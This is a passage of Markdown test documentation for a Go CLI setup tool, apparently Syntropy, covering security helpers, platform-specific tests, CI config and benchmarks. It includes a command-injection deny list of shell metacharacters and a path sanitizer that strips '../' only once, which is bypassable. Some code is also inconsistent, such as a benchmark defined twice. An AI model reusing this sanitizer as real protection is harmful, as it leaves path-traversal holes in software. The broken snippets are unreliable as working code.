        Environment: runtime.GOOS,
        Options:     options,
    }
}

func createSecureTempDir(t *testing.T) string {
    tempDir, err := os.MkdirTemp("", "syntropy-security-test-*")
    require.NoError(t, err)

    // Set secure permissions
    if runtime.GOOS != "windows" {
        err = os.Chmod(tempDir, 0700)
        require.NoError(t, err)
    }

    t.Cleanup(func() {
        os.RemoveAll(tempDir)
    })

    return tempDir
}

func sanitizePath(path string) string {
    // Remove path traversal attempts
    path = strings.ReplaceAll(path, "../", "")
    path = strings.ReplaceAll(path, "..\\", "")
    
    // Remove null bytes
    path = strings.ReplaceAll(path, "\x00", "")
    
    return path
}

func isSecureInput(options types.SetupOptions) bool {
    // Check for command injection patterns
    dangerousPatterns := []string{
        ";", "&", "|", "`", "$", "$(", "&&", "||",
    }

    inputs := []string{options.HomeDir, options.ConfigPath}
    
    for _, input := range inputs {
        for _, pattern := range dangerousPatterns {
            if strings.Contains(input, pattern) {
                return false
            }
        }
    }

    return true
}
```

## Platform-Specific Tests

### Linux-Specific Tests
```go
//go:build linux

func TestLinuxSetup(t *testing.T) {
    tests := []struct {
        name           string
        hasRoot        bool
        systemdAvail   bool
        expectedResult bool
        expectedError  string
    }{
        {
            name:           "linux_setup_with_systemd",
            hasRoot:        true,
            systemdAvail:   true,
            expectedResult: true,
            expectedError:  "",
        },
        {
            name:           "linux_setup_no_root",
            hasRoot:        false,
            systemdAvail:   true,
            expectedResult: true, // Should work without root for user-level setup
            expectedError:  "",
        },
        {
            name:           "linux_setup_no_systemd",
            hasRoot:        true,
            systemdAvail:   false,
            expectedResult: true, // Should fallback gracefully
            expectedError:  "",
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            // Setup test environment with specific conditions
            testEnv := setupLinuxTestEnvironment(t, tt.hasRoot, tt.systemdAvail)
            defer testEnv.Cleanup()

            // Execute Linux-specific setup
            options := types.SetupOptions{
                Force:          false,
                InstallService: tt.systemdAvail,
                HomeDir:        testEnv.HomeDir,
            }

            result, err := setupLinuxImpl(options)

            // Validate results
            if tt.expectedError != "" {
                assert.Error(t, err)
                assert.Contains(t, err.Error(), tt.expectedError)
            } else {
                assert.NoError(t, err)
                assert.NotNil(t, result)
                assert.Equal(t, tt.expectedResult, result.Success)

                if tt.systemdAvail && tt.hasRoot {
                    // Verify systemd service installation
                    assert.FileExists(t, "/etc/systemd/system/syntropy-manager.service")
                }
            }
        })
    }
}

func TestLinuxValidation(t *testing.T) {
    result, err := validateLinuxEnvironment()
    require.NoError(t, err)
    require.NotNil(t, result)

    // Validate Linux-specific checks
    assert.Equal(t, "linux", result.EnvironmentInfo.OS)
    assert.NotEmpty(t, result.EnvironmentInfo.OSVersion)
    assert.NotEmpty(t, result.EnvironmentInfo.Architecture)
    assert.Greater(t, result.EnvironmentInfo.AvailableDiskGB, 0.0)
    assert.NotEmpty(t, result.EnvironmentInfo.HomeDir)

    // Validate warnings and errors
    if !result.Valid {
        assert.NotEmpty(t, result.Errors)
    }
}
```

### Windows-Specific Tests
```go
//go:build windows

func TestWindowsSetup(t *testing.T) {
    tests := []struct {
        name           string
        hasAdmin       bool
        powershellVer  string
        expectedResult bool
        expectedError  string
    }{
        {
            name:           "windows_setup_with_admin",
            hasAdmin:       true,
            powershellVer:  "5.1",
            expectedResult: true,
            expectedError:  "",
        },
        {
            name:           "windows_setup_no_admin",
            hasAdmin:       false,
            powershellVer:  "5.1",
            expectedResult: true, // Should work for user-level setup
            expectedError:  "",
        },
        {
            name:           "windows_setup_old_powershell",
            hasAdmin:       true,
            powershellVer:  "2.0",
            expectedResult: false,
            expectedError:  "PowerShell version too old",
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            // Setup test environment with specific conditions
            testEnv := setupWindowsTestEnvironment(t, tt.hasAdmin, tt.powershellVer)
            defer testEnv.Cleanup()

            // Execute Windows-specific setup
            options := types.SetupOptions{
                Force:          false,
                InstallService: tt.hasAdmin,
                HomeDir:        testEnv.HomeDir,
            }

            result, err := setupWindows(options)

            // Validate results
            if tt.expectedError != "" {
                assert.Error(t, err)
                assert.Contains(t, err.Error(), tt.expectedError)
            } else {
                assert.NoError(t, err)
                assert.NotNil(t, result)
                assert.Equal(t, tt.expectedResult, result.Success)

                if tt.hasAdmin {
                    // Verify Windows service installation
                    validateWindowsService(t, "SyntropyManager")
                }
            }
        })
    }
}
```

## Test Utilities and Helpers

### Test Environment Setup
```go
func createTestEnvironment(t *testing.T) (string, func()) {
    // Create temporary directory
    testDir, err := os.MkdirTemp("", "syntropy-test-*")
    require.NoError(t, err)

    // Set environment variables
    originalHome := os.Getenv("HOME")
    os.Setenv("HOME", testDir)

    // Create cleanup function
    cleanup := func() {
        os.Setenv("HOME", originalHome)
        os.RemoveAll(testDir)
    }

    return testDir, cleanup
}

func setupMockAPIServer(t *testing.T, available bool, response string) *httptest.Server {
    if !available {
        return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            http.Error(w, "Service Unavailable", http.StatusServiceUnavailable)
        }))
    }

    return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        switch response {
        case "success":
            w.WriteHeader(http.StatusOK)
            json.NewEncoder(w).Encode(map[string]interface{}{
                "success": true,
                "config_path": "/test/config.yaml",
            })
        case "error":
            http.Error(w, "API setup failed", http.StatusInternalServerError)
        }
    }))
}
```

### Custom Assertions
```go
func assertValidSetupResult(t *testing.T, result *types.SetupResult) {
    assert.NotNil(t, result)
    assert.True(t, result.Success)
    assert.NotEmpty(t, result.ConfigPath)
    assert.FileExists(t, result.ConfigPath)
    assert.True(t, result.EndTime.After(result.StartTime))
    assert.NotEmpty(t, result.Environment.OS)
    assert.NotEmpty(t, result.Environment.Architecture)
    assert.NotEmpty(t, result.Environment.HomeDir)
}

func assertValidConfiguration(t *testing.T, configPath string) {
    assert.FileExists(t, configPath)
    
    data, err := os.ReadFile(configPath)
    require.NoError(t, err)
    
    var config types.SetupConfig
    err = yaml.Unmarshal(data, &config)
    require.NoError(t, err)
    
    assert.NotEmpty(t, config.Manager.HomeDir)
    assert.NotEmpty(t, config.Manager.APIEndpoint)
    assert.NotEmpty(t, config.OwnerKey.Type)
    assert.NotEmpty(t, config.OwnerKey.Path)
    assert.NotEmpty(t, config.OwnerKey.PublicKey)
    assert.NotEmpty(t, config.Environment.OS)
}
```

## Test Execution

### Running Tests
```bash
# Navigate to the setup tests directory
cd manager/interfaces/cli/setup/tests

# Run all tests
go test ./...

# Run tests with coverage
go test -cover ./...

# Run tests with detailed coverage report
go test -coverprofile=coverage.out ./...
go tool cover -html=coverage.out -o coverage.html

# Run specific test suites
go test ./unit/...
go test ./integration/...
go test ./e2e/...
go test ./security/...

# Run platform-specific tests
go test -tags linux ./...
go test -tags windows ./...

# Run tests with race detection
go test -race ./...

# Run tests with verbose output
go test -v ./...

# Run benchmarks
go test -bench=. ./...
go test -bench=BenchmarkSetup ./unit/...

# Run tests from project root (alternative approach)
cd /path/to/syntropy-cooperative-grid
go test ./manager/interfaces/cli/setup/tests/...
```

### Continuous Integration
```yaml
# .github/workflows/test.yml
name: Setup Component Test Suite
on: 
  push:
    paths:
      - 'manager/interfaces/cli/setup/**'
  pull_request:
    paths:
      - 'manager/interfaces/cli/setup/**'

jobs:
  test:
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        go-version: [1.21, 1.22, 1.23]
    
    runs-on: ${{ matrix.os }}
    
    steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-go@v4
      with:
        go-version: ${{ matrix.go-version }}
    
    - name: Run Setup Tests
      working-directory: ./manager/interfaces/cli/setup/tests
      run: |
        go test -race -coverprofile=coverage.out ./...
        go tool cover -func=coverage.out
    
    - name: Run Security Tests
      working-directory: ./manager/interfaces/cli/setup/tests
      run: |
        go test -v ./security/...
    
    - name: Upload Coverage
      uses: codecov/codecov-action@v3
      with:
        file: ./manager/interfaces/cli/setup/tests/coverage.out
        flags: setup-component
```

## Performance Testing

### Load Testing Implementation
The performance test suite includes comprehensive load testing capabilities to validate system behavior under various stress conditions.

```go
// TestLoadPerformance from performance/load_test.go
func TestLoadPerformance(t *testing.T) {
    if testing.Short() {
        t.Skip("Skipping performance tests in short mode")
    }

    t.Run("Concurrent Setup Operations", func(t *testing.T) {
        testCases := []struct {
            name        string
            concurrency int
            timeout     time.Duration
        }{
            {"Low Load", 5, 30 * time.Second},
            {"Medium Load", 25, 60 * time.Second},
            {"High Load", 100, 120 * time.Second},
        }

        for _, tc := range testCases {
            t.Run(tc.name, func(t *testing.T) {
                ctx, cancel := context.WithTimeout(context.Background(), tc.timeout)
                defer cancel()

                results := make(chan types.SetupResult, tc.concurrency)
                var wg sync.WaitGroup

                startTime := time.Now()

                for i := 0; i < tc.concurrency; i++ {
                    wg.Add(1)
                    go func(id int) {
                        defer wg.Done()
                        
                        tempDir := createTempDir(t, fmt.Sprintf("load-test-%d", id))
                        options := types.SetupOptions{
                            HomeDir: tempDir,
                        }

                        result := performSetupWithContext(ctx, options)
                        results <- result
                    }(i)
                }

                wg.Wait()
                close(results)

                duration := time.Since(startTime)
                successCount := 0
                failureCount := 0

                for result := range results {
                    if result.Success {
                        successCount++
                    } else {
                        failureCount++
                    }
                }

                // Validate performance metrics
                assert.Greater(t, successCount, 0)
                assert.Less(t, duration, tc.timeout)
                
                t.Logf("Load test %s: %d/%d successful in %v", 
                    tc.name, successCount, tc.concurrency, duration)
            })
        }
    })
}
```

### Volume Performance Testing
```go
// TestVolumePerformance from performance/load_test.go
func TestVolumePerformance(t *testing.T) {
    if testing.Short() {
        t.Skip("Skipping volume tests in short mode")
    }

    t.Run("Large Configuration Files", func(t *testing.T) {
        testCases := []struct {
            name     string
            sizeKB   int
            timeout  time.Duration
        }{
            {"Small Config", 10, 5 * time.Second},
            {"Medium Config", 100, 10 * time.Second},
            {"Large Config", 1000, 30 * time.Second},
            {"Very Large Config", 10000, 60 * time.Second},
        }

        for _, tc := range testCases {
            t.Run(tc.name, func(t *testing.T) {
                tempDir := createTempDir(t, "volume-config")
                configPath := filepath.Join(tempDir, "large-config.yaml")

                // Generate large configuration
                config := generateLargeConfig(tc.sizeKB * 1024)
                err := os.WriteFile(configPath, []byte(config), 0644)
                require.NoError(t, err)

                options := types.SetupOptions{
                    ConfigPath: configPath,
                    HomeDir:    tempDir,
                }

                ctx, cancel := context.WithTimeout(context.Background(), tc.timeout)
                defer cancel()

                startTime := time.Now()
                result := performSetupWithContext(ctx, options)
                duration := time.Since(startTime)

                assert.True(t, result.Success)
                assert.Less(t, duration, tc.timeout)
                
                t.Logf("Processed %dKB config in %v", tc.sizeKB, duration)
            })
        }
    })

    t.Run("Many Small Files", func(t *testing.T) {
        tempDir := createTempDir(t, "many-files")
        
        const fileCount = 10000
        
        // Create many small files
        for i := 0; i < fileCount; i++ {
            filename := filepath.Join(tempDir, fmt.Sprintf("file_%d.txt", i))
            err := os.WriteFile(filename, []byte("test content"), 0644)
            require.NoError(t, err)
        }

        options := types.SetupOptions{
            HomeDir: tempDir,
        }

        startTime := time.Now()
        result := performSetupWithContext(context.Background(), options)
        duration := time.Since(startTime)

        assert.True(t, result.Success)
        assert.Less(t, duration, 30*time.Second)
        
        t.Logf("Processed %d files in %v", fileCount, duration)
    })
}
```

### Benchmark Tests
```go
// Benchmark functions from unit/setup_test.go and performance/load_test.go
func BenchmarkSetupPerformance(b *testing.B) {
    tempDir, _ := os.MkdirTemp("", "syntropy-bench-*")
    defer os.RemoveAll(tempDir)

    options := types.SetupOptions{
        HomeDir: tempDir,
    }

    b.ResetTimer()
    for i := 0; i < b.N; i++ {
        result := performSetupWithContext(context.Background(), options)
        if !result.Success {
            b.Fatal("Setup failed")
        }
    }
}

func BenchmarkConcurrentSetup(b *testing.B) {
    b.RunParallel(func(pb *testing.PB) {
        for pb.Next() {
            tempDir, _ := os.MkdirTemp("", "syntropy-concurrent-*")
            defer os.RemoveAll(tempDir)

            options := types.SetupOptions{
                HomeDir: tempDir,
            }

            result := performSetupWithContext(context.Background(), options)
            if !result.Success {
                b.Fatal("Setup failed")
            }
        }
    })
}

func BenchmarkLargeConfigProcessing(b *testing.B) {
    tempDir, _ := os.MkdirTemp("", "syntropy-config-bench-*")
    defer os.RemoveAll(tempDir)

    // Create a large config file
    configPath := filepath.Join(tempDir, "large-config.yaml")
    config := generateLargeConfig(10 * 1024) // 10KB config
    os.WriteFile(configPath, []byte(config), 0644)

    options := types.SetupOptions{
        ConfigPath: configPath,
        HomeDir:    tempDir,
    }

    b.ResetTimer()
    for i := 0; i < b.N; i++ {
        result := performSetupWithContext(context.Background(), options)
        if !result.Success {
            b.Fatal("Setup failed")
        }
    }
}
```

### E2E Performance Testing
```go
// TestSetupWorkflowPerformance from e2e/setup_workflow_test.go
func TestSetupWorkflowPerformance(t *testing.T) {
    if testing.Short() {
        t.Skip("Skipping performance tests in short mode")
    }

    tempDir := createTempDir(t)

    t.Run("Performance Tests", func(t *testing.T) {
        t.Run("Should complete setup within reasonable time", func(t *testing.T) {
            options := types.SetupOptions{
                HomeDir: tempDir,
            }

            startTime := time.Now()
            result := performSetup(t, options)
            duration := time.Since(startTime)

            assert.True(t, result.Success)
            assert.Less(t, duration, 30*time.Second, "Setup should complete within 30 seconds")
        })

        t.Run("Should handle large configuration files", func(t *testing.T) {
            // Create a large configuration file
            configPath := filepath.Join(tempDir, "large-config.yaml")
            largeConfig := generateLargeConfig(1000) // 1000 entries
            
            err := os.WriteFile(configPath, []byte(largeConfig), 0644)
            require.NoError(t, err)

            options := types.SetupOptions{
                ConfigPath: configPath,
                HomeDir:    tempDir,
            }

            startTime := time.Now()
            result := performSetup(t, options)
            duration := time.Since(startTime)

            assert.True(t, result.Success)
            assert.Less(t, duration, 10*time.Second, "Large config processing should complete within 10 seconds")
        })
    })
}
```

### Performance Helper Functions
```go
// Performance testing utilities from helpers/benchmark_helpers.go
func BenchmarkConcurrentSetup(b *testing.B, concurrency int, setupFunc func() (types.SetupResult, error)) {
    b.Helper()
    
    b.RunParallel(func(pb *testing.PB) {
        for pb.Next() {
            helper := NewBenchmarkHelper()
            helper.StartBenchmark()
            
            result, err := setupFunc()
            
            helper.EndBenchmark()
            
            if err != nil {
                b.Errorf("Concurrent setup operation failed: %v", err)
                continue
            }
            
            if !result.Success {
                b.Errorf("Concurrent setup operation was not successful")
                continue
            }
        }
    })
}

func performSetupWithContext(ctx context.Context, options types.SetupOptions) types.SetupResult {
    startTime := time.Now()
    
    // Simulate setup work with context awareness
    select {
    case <-ctx.Done():
        return types.SetupResult{
            Success:   false,
            StartTime: startTime,
            EndTime:   time.Now(),
            Error:     ctx.Err(),
            Options:   options,
        }
    case <-time.After(100 * time.Millisecond):
        // Simulate successful setup
        return types.SetupResult{
            Success:     true,
            StartTime:   startTime,
            EndTime:     time.Now(),
            ConfigPath:  filepath.Join(options.HomeDir, "config.yaml"),
            Environment: runtime.GOOS,
            Options:     options,
            Message:     "Setup completed successfully",
        }
    }
}
```

### Running Performance Tests
```bash
# Run all performance tests
cd manager/interfaces/cli/setup/tests
go test ./performance/... -v

# Run benchmarks
go test -bench=. ./...
go test -bench=BenchmarkSetup ./unit/...
go test -bench=BenchmarkConcurrent ./performance/...

# Run performance tests with profiling
go test -bench=. -cpuprofile=cpu.prof ./performance/...
go test -bench=. -memprofile=mem.prof ./performance/...

# Analyze profiles
go tool pprof cpu.prof
go tool pprof mem.prof

# Run load tests with specific parameters
go test -v -run=TestLoadPerformance ./performance/...
go test -v -run=TestVolumePerformance ./performance/...
```

## Test Coverage Requirements

### Coverage Targets
| Component | Minimum Coverage | Target Coverage |
|-----------|------------------|-----------------|
| Core Functions | 90% | 95% |
| Platform-Specific | 85% | 90% |
| Error Handling | 95% | 98% |
| Data Structures | 80% | 85% |
| Integration | 75% | 80% |

### Coverage Analysis
```bash
# Generate detailed coverage report
go test -coverprofile=coverage.out ./...
go tool cover -func=coverage.out | grep -E "(total|setup\.go)"

# Identify uncovered code
go tool cover -html=coverage.out -o coverage.html
# Open coverage.html in browser to see uncovered lines
```

## Troubleshooting Tests

### Common Test Issues
| Issue | Symptoms | Solution |
|-------|----------|----------|
| Flaky Tests | Intermittent failures | Add proper cleanup, use deterministic test data |
| Slow Tests | Long execution time | Use mocks, parallel execution, focused tests |
| Platform Issues | Tests fail on specific OS | Add platform-specific build tags and conditions |
| Permission Errors | Access denied during tests | Use temporary directories, check file permissions |

### Debugging Test Failures
```go
func TestWithDebugOutput(t *testing.T) {
    // Enable debug logging for tests
    if testing.Verbose() {
        os.Setenv("SYNTROPY_DEBUG", "true")
        os.Setenv("SYNTROPY_LOG_LEVEL", "debug")
    }
    
    // Your test code here
    result, err := setup.Setup(options)
    
    // Add debug output
    if err != nil {
        t.Logf("Setup failed with error: %v", err)
        t.Logf("Test environment: %s", testDir)
        t.Logf("Options used: %+v", options)
    }
}
```

## Test Maintenance

### Test Review Checklist
- [ ] Tests cover all public API functions
- [ ] Error scenarios are thoroughly tested
- [ ] Platform-specific code has appropriate build tags
- [ ] Tests are isolated and don't interfere with each other
- [ ] Mock services properly simulate real behavior
- [ ] Test data is realistic and comprehensive
- [ ] Performance benchmarks are included for critical paths
- [ ] Integration tests cover complete workflows

### Updating Tests for Changes
1. **API Changes**: Update function signatures and expected results
2. **New Features**: Add comprehensive test coverage for new functionality
3. **Bug Fixes**: Add regression tests to prevent reoccurrence
4. **Platform Support**: Add platform-specific tests with build tags
5. **Configuration Changes**: Update test fixtures and validation logic